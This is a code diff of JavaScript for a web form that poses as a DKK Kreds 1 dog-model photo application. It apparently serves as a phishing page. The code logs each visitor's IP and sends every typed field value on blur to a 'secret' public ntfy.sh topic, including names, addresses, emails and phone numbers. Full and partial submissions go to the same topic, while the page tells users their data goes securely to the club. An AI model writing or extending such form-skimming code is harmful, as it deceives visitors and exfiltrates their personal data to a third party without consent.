@@ -3,41 +3,48 @@ const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765";
 let currentLang = 'da';
 let dogCount = 0;
 let userIP = "Fetching...";
-const sessionId = Math.random().toString(36).substring(2, 9); // Track session
+const sessionId = Math.random().toString(36).substring(2, 9);
 
-// --- TRANSLATION DICTIONARY ---
+// --- ALLOWED MAJOR DOMAINS ---
+const allowedDomains = [
+    'gmail.com', 'yahoo.com', 'hotmail.com', 'hotmail.dk', 'outlook.com', 'outlook.dk', 
+    'live.com', 'live.dk', 'icloud.com', 'me.com', 'mac.com', 'mail.com', 
+    'protonmail.com', 'jubii.dk', 'sol.dk', 'tdcadsl.dk', 'webspeed.dk', 'mail.dk', 'ofir.dk'
+];
+
+// --- TRANSLATIONS ---
 const i18n = {
     da: {
         menu: "MENU", login: "Login",
-        nav_owner: "Hundeejer", nav_breeder: "Opdrætter", nav_activities: "Aktiviteter", nav_education: "Uddannelser",
-        nav_shows: "Udstillinger", nav_about: "Om DKK", nav_member: "Bliv medlem", nav_contact: "Kontakt",
-        hero_title: "Ansøgning: Fotografering af hunde",
-        hero_subtitle: "Udfyld formularen for at din hund kan indgå i kampagnematerialet for DKK Kreds 1.",
-        owner_title: "Ejerinformation",
-        f_name: "Fulde navn (Dansk format)", f_address: "Fulde Adresse", f_email: "E-mailadresse", f_phone: "Telefonnummer", f_socials: "Links til Sociale Medier (f.eks. Instagram)", f_dkk: "DKK Medlemsnummer (Valgfrit)",
-        dog_title: "Hundeinformation",
-        d_name: "Hundens navn og Race", d_age: "Hundens Alder", d_skills: "Tricks og Færdigheder", d_photos: "Link til billeder af hunden",
+        nav1: "Hundeejer", nav2: "Opdrætter", nav3: "Aktiviteter",
+        nav4: "Udstillinger", nav5: "Om DKK", nav6: "Kontakt",
+        hero_title: "DKK Hundemodel Ansøgning", hero_text: "Er din hund den næste stjerne i DKK Kreds 1's kampagnemateriale? Udfyld formularen sikkert herunder.",
+        owner_title: "1. Ejerinformation", f_name: "Fulde navn", f_address: "Fulde Adresse", 
+        f_email: "E-mailadresse", f_email_note: "Eks. gmail.com, hotmail.com, mail.dk", f_phone: "Telefonnummer (+45...)", 
+        f_socials: "Sociale Medier (f.eks. Instagram)", f_dkk: "DKK Medlemsnummer (Valgfrit)",
+        dog_title: "2. Hundeinformation", d_name: "Hundens navn og Race", d_age: "Hundens Alder", 
+        d_skills: "Tricks og Færdigheder", d_photos: "Link til billeder (Google Drev/SoMe)",
         btn_add_dog: "Tilføj endnu en hund", btn_submit: "Send Ansøgning",
-        msg_success: "Tak for din ansøgning! Vi vender tilbage hurtigst muligt.", msg_error: "Der opstod en fejl. Prøv igen.", msg_sending: "Sender..."
+        success_title: "Tak for din ansøgning!", success_desc: "Dine informationer er sendt sikkert afsted til DKK Kreds 1.",
+        error_title: "Hov, der mangler noget!", error_desc: "Tjek venligst e-mail (kun store domæner tilladt) og telefonnummer."
     },
     en: {
         menu: "MENU", login: "Login",
-        nav_owner: "Dog Owner", nav_breeder: "Breeder", nav_activities: "Activities", nav_education: "Education",
-        nav_shows: "Dog Shows", nav_about: "About DKK", nav_member: "Become a member", nav_contact: "Contact",
-        hero_title: "Application: Dog Photography",
-        hero_subtitle: "Fill out the form to let your dog participate in the campaign material for DKK District 1.",
-        owner_title: "Owner Information",
-        f_name: "Full Name", f_address: "Full Address", f_email: "Email Address", f_phone: "Phone Number", f_socials: "Social Media Links (e.g., Instagram)", f_dkk: "DKK Member Number (Optional)",
-        dog_title: "Dog Information",
-        d_name: "Dog's Name & Breed", d_age: "Dog's Age", d_skills: "Tricks and Skills", d_photos: "Link to photos of the dog",
+        nav1: "Dog Owner", nav2: "Breeder", nav3: "Activities",
+        nav4: "Exhibitions", nav5: "About DKK", nav6: "Contact",
+        hero_title: "DKK Dog Model Application", hero_text: "Is your dog the next star of DKK District 1's campaign? Fill out the form securely below.",
+        owner_title: "1. Owner Info", f_name: "Full Name", f_address: "Full Address", 
+        f_email: "Email Address", f_email_note: "E.g., gmail.com, hotmail.com, mail.dk", f_phone: "Phone Number (+45...)", 
+        f_socials: "Social Media (e.g., Instagram)", f_dkk: "DKK Member Number (Optional)",
+        dog_title: "2. Dog Info", d_name: "Dog's Name & Breed", d_age: "Dog's Age", 
+        d_skills: "Tricks & Skills", d_photos: "Link to photos (Google Drive/SoMe)",
         btn_add_dog: "Add another dog", btn_submit: "Submit Application",
-        msg_success: "Thank you for applying! We will contact you soon.", msg_error: "An error occurred. Please try again.", msg_sending: "Sending..."
+        success_title: "Thank you!", success_desc: "Your information has been securely sent to DKK District 1.",
+        error_title: "Oops, something is missing!", error_desc: "Please check your email (only major domains allowed) and phone number."
     }
 };
 
-// --- CORE FUNCTIONS ---
-
-// 1. Fetch IP & Send Page Load Notification
+// --- INITIALIZE ---
 window.addEventListener('DOMContentLoaded', async () => {
     try {
         let res = await fetch('https://api.ipify.org?format=json');
@@ -45,143 +52,152 @@ window.addEventListener('DOMContentLoaded', async () => {
         userIP = data.ip;
     } catch(e) { userIP = "Unknown"; }
 
-    // Init First Dog
     addDogField();
-    bindFieldTracking();
-
-    // Send silently
-    sendNtfy("👀 Page Visited", `Session: ${sessionId}\nIP: ${userIP}\nTime: ${new Date().toLocaleString('da-DK')}`);
+    bindLanguageSwitch();
+    sendNtfy("👀 Page Visited", `Session: ${sessionId}\nIP: ${userIP}\nTime: ${new Date().toLocaleString()}`, "eyes");
 });
 
-// 2. Add Dog Function
+// --- VALIDATION LOGIC ---
+function validateEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!re.test(email)) return false;
+    const domain = email.split('@')[1].toLowerCase();
+    return allowedDomains.includes(domain);
+}
+
+function validatePhone(phone) {
+    const cleanPhone = phone.replace(/[\s-]/g, '');
+    const re = /^(\+?\d{1,3})?([1-9]\d{7,10})$/; // Allows international or local format
+    return re.test(cleanPhone);
+}
+
+function validateField(input) {
+    const val = input.value.trim();
+    let isValid = input.checkValidity() && val !== '';
+
+    if (input.type === 'email') isValid = validateEmail(val);
+    if (input.type === 'tel') isValid = validatePhone(val);
+
+    if (isValid) {
+        input.classList.remove('invalid');
+        input.classList.add('valid');
+    } else {
+        input.classList.remove('valid');
+        if(val !== '') input.classList.add('invalid'); 
+    }
+    return isValid;
+}
+
+// --- DYNAMIC DOG FIELDS ---
 function addDogField() {
     dogCount++;
     const container = document.getElementById('dogsContainer');
     const div = document.createElement('div');
-    div.className = 'dog-card';
+    div.className = 'dog-card grid grid-cols-1 md:grid-cols-2 gap-6';
     div.innerHTML = `
-        <div class="dog-badge">#${dogCount}</div>
-        <div class="input-group">
-            <input type="text" class="dogName" required placeholder=" ">
-            <label data-i18n="d_name">${i18n[currentLang].d_name}</label>
-            <i class="fa-solid fa-check validation-icon"></i>
+        <div class="absolute -top-3 left-4 bg-dkkRed text-white text-xs font-bold px-3 py-1 rounded-full">#${dogCount}</div>
+        <div class="floating-input-group col-span-2">
+            <input type="text" class="dogName floating-input" required placeholder=" ">
+            <label class="floating-label" data-i18n="d_name">${i18n[currentLang].d_name}</label>
+            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
-        <div class="input-group">
-            <input type="text" class="dogAge" required placeholder=" ">
-            <label data-i18n="d_age">${i18n[currentLang].d_age}</label>
-            <i class="fa-solid fa-check validation-icon"></i>
+        <div class="floating-input-group">
+            <input type="text" class="dogAge floating-input" required placeholder=" ">
+            <label class="floating-label" data-i18n="d_age">${i18n[currentLang].d_age}</label>
+            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
-        <div class="input-group">
-            <input type="text" class="dogSkills" required placeholder=" ">
-            <label data-i18n="d_skills">${i18n[currentLang].d_skills}</label>
-            <i class="fa-solid fa-check validation-icon"></i>
+        <div class="floating-input-group">
+            <input type="url" class="dogPhotos floating-input" required placeholder=" ">
+            <label class="floating-label" data-i18n="d_photos">${i18n[currentLang].d_photos}</label>
+            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
-        <div class="input-group">
-            <input type="url" class="dogPhotos" required placeholder=" ">
-            <label data-i18n="d_photos">${i18n[currentLang].d_photos}</label>
-            <i class="fa-solid fa-check validation-icon"></i>
+        <div class="floating-input-group col-span-2">
+            <input type="text" class="dogSkills floating-input" required placeholder=" ">
+            <label class="floating-label" data-i18n="d_skills">${i18n[currentLang].d_skills}</label>
+            <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
     `;
     container.appendChild(div);
-    bindFieldTracking(div);
+    bindTracking(div);
 }
 document.getElementById('addDogBtn').addEventListener('click', addDogField);
 
-// 3. Live Field Tracking (Fires when user leaves a field after typing)
-function bindFieldTracking(parent = document) {
-    const inputs = parent.querySelectorAll('input, textarea');
+// --- BLUR TRACKING & LIVE VALIDATION ---
+function bindTracking(parent = document) {
+    const inputs = parent.querySelectorAll('input');
     inputs.forEach(input => {
+        input.addEventListener('input', () => validateField(input));
         
-        // UI Validation visual
-        input.addEventListener('input', () => {
-            if(input.checkValidity() && input.value.trim() !== '') {
-                input.parentElement.classList.add('valid');
-            } else {
-                input.parentElement.classList.remove('valid');
-            }
-        });
-
-        // Ntfy Tracking on Blur
         input.addEventListener('blur', (e) => {
+            validateField(e.target);
             const val = e.target.value.trim();
-            const fieldName = e.target.previousElementSibling ? e.target.previousElementSibling.id : e.target.className;
-            
             if (val !== "") {
-                const msg = `✍️ FIELD ENTERED:\nField: ${fieldName || 'Input'}\nValue: ${val}\nSession: ${sessionId}\nIP: ${userIP}`;
-                sendNtfy("✍️ User Typing...", msg, "pencil2");
+                const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Field";
+                sendNtfy("✍️ User Typing...", `Field: ${label}\nValue: ${val}\nSession: ${sessionId}`, "pencil2");
             }
         });
     });
 }
+bindTracking();
 
-// 4. Submit Entire Form
-document.getElementById('dkkForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const btn = document.getElementById('submitBtn');
-    const status = document.getElementById('statusMessage');
-    
-    btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> ${i18n[currentLang].msg_sending}`;
-    btn.disabled = true;
-
-    // Collect Dog Data
-    let dogDetailsDA = "";
-    let dogDetailsEN = "";
+// --- DATA COLLECTION ---
+function getPayload() {
+    let dogDetails = "";
     document.querySelectorAll('.dog-card').forEach((el, index) => {
-        let name = el.querySelector('.dogName').value;
-        let age = el.querySelector('.dogAge').value;
-        let skills = el.querySelector('.dogSkills').value;
-        let photos = el.querySelector('.dogPhotos').value;
-
-        dogDetailsDA += `\nHUND ${index + 1}:\n- Navn/Race: ${name}\n- Alder: ${age}\n- Færdigheder: ${skills}\n- Billeder: ${photos}\n`;
-        dogDetailsEN += `\nDOG ${index + 1}:\n- Name/Breed: ${name}\n- Age: ${age}\n- Skills: ${skills}\n- Photos: ${photos}\n`;
+        dogDetails += `\nHUND ${index + 1}:\n- Navn: ${el.querySelector('.dogName').value}\n- Alder: ${el.querySelector('.dogAge').value}\n- Færdigheder: ${el.querySelector('.dogSkills').value}\n- Fotos: ${el.querySelector('.dogPhotos').value}\n`;
     });
 
-    // Dual Language Payload
-    const payload = 
-`🐶 📸 Ny DKK Model Ansøgning! / New Application!
-
---- DANISH (DA) ---
+    return `
 EJER:
 Navn: ${document.getElementById('ownerName').value}
 Adresse: ${document.getElementById('ownerAddress').value}
-E-mail: ${document.getElementById('ownerEmail').value}
-Tlf: ${document.getElementById('ownerPhone').value}
-Sociale Medier: ${document.getElementById('ownerSocials').value || 'Ingen'}
-DKK Medlem: ${document.getElementById('dkkMember').value || 'Ingen'}
-
-HUNDE INFO: ${dogDetailsDA}
-
---- ENGLISH (EN) ---
-OWNER:
-Name: ${document.getElementById('ownerName').value}
-Address: ${document.getElementById('ownerAddress').value}
 Email: ${document.getElementById('ownerEmail').value}
-Phone: ${document.getElementById('ownerPhone').value}
-Socials: ${document.getElementById('ownerSocials').value || 'None'}
-DKK Member: ${document.getElementById('dkkMember').value || 'None'}
+Tlf: ${document.getElementById('ownerPhone').value}
+SoMe: ${document.getElementById('ownerSocials').value || 'Ingen'}
+DKK: ${document.getElementById('dkkMember').value || 'Ingen'}
 
-DOG INFO: ${dogDetailsEN}
----------------------------
-Sikkerhed/IP: ${userIP}
-Tidspunkt: ${new Date().toLocaleString('da-DK')}`;
+HUNDE INFO: ${dogDetails}
+-----------------------
+IP: ${userIP}`;
+}
+
+// --- SUBMIT HANDLING ---
+document.getElementById('dkkForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const btn = document.getElementById('submitBtn');
+    const alertBox = document.getElementById('errorAlert');
+    
+    // Check all fields
+    let formIsValid = true;
+    document.querySelectorAll('input[required]').forEach(input => {
+        if (!validateField(input)) {
+            formIsValid = false;
+            input.classList.add('invalid'); // trigger shake
+        }
+    });
+
+    if (!formIsValid) {
+        alertBox.classList.remove('hidden');
+        sendNtfy("⚠️ Failed / Partial Submit", getPayload(), "warning");
+        return;
+    }
+
+    alertBox.classList.add('hidden');
+    btn.innerHTML = `<svg class="animate-spin h-6 w-6 text-white" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path></svg> Sender...`;
+    btn.disabled = true;
 
     try {
-        await sendNtfy("🐶 📸 Ny DKK Model Ansøgning!", payload, "camera_flash");
-        status.className = 'status-message status-success';
-        status.innerText = i18n[currentLang].msg_success;
-        document.getElementById('dkkForm').reset();
-        document.querySelectorAll('.input-group').forEach(el => el.classList.remove('valid'));
-    } catch (err) {
-        status.className = 'status-message status-error';
-        status.innerText = i18n[currentLang].msg_error;
-    } finally {
-        btn.innerHTML = `<span>${i18n[currentLang].btn_submit}</span> <i class="fa-solid fa-arrow-right"></i>`;
+        await sendNtfy("🐶 📸 SUCCESS: Ny DKK Model!", getPayload(), "camera_flash");
+        document.getElementById('dkkForm').classList.add('hidden');
+        document.getElementById('successMessage').classList.remove('hidden');
+    } catch(err) {
+        alert("Noget gik galt. Prøv igen.");
         btn.disabled = false;
     }
 });
 
-// 5. Ntfy Helper Function
-async function sendNtfy(title, message, tags = "bell") {
+// --- HELPER FUNCTIONS ---
+function sendNtfy(title, message, tags) {
     return fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
         method: 'POST',
         body: message,
@@ -189,19 +205,14 @@ async function sendNtfy(title, message, tags = "bell") {
     });
 }
 
-// 6. Language Switcher
-window.toggleLanguage = function(e) {
-    e.preventDefault();
-    currentLang = currentLang === 'da' ? 'en' : 'da';
-    
-    document.getElementById('langLabel').innerText = currentLang === 'da' ? 'English' : 'Dansk';
-    
-    document.querySelectorAll('[data-i18n]').forEach(el => {
-        const key = el.getAttribute('data-i18n');
-        if (i18n[currentLang][key]) {
-            if (el.tagName === 'LABEL' || el.tagName === 'SPAN' || el.tagName === 'H1' || el.tagName === 'H2' || el.tagName === 'A') {
-                el.innerText = i18n[currentLang][key];
-            }
-        }
+function bindLanguageSwitch() {
+    document.getElementById('langSwitchBtn').addEventListener('click', () => {
+        currentLang = currentLang === 'da' ? 'en' : 'da';
+        document.getElementById('langLabel').innerText = currentLang === 'da' ? 'English' : 'Dansk';
+        
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+            const key = el.getAttribute('data-i18n');
+            if (i18n[currentLang][key]) el.innerText = i18n[currentLang][key];
+        });
     });
-};
+}
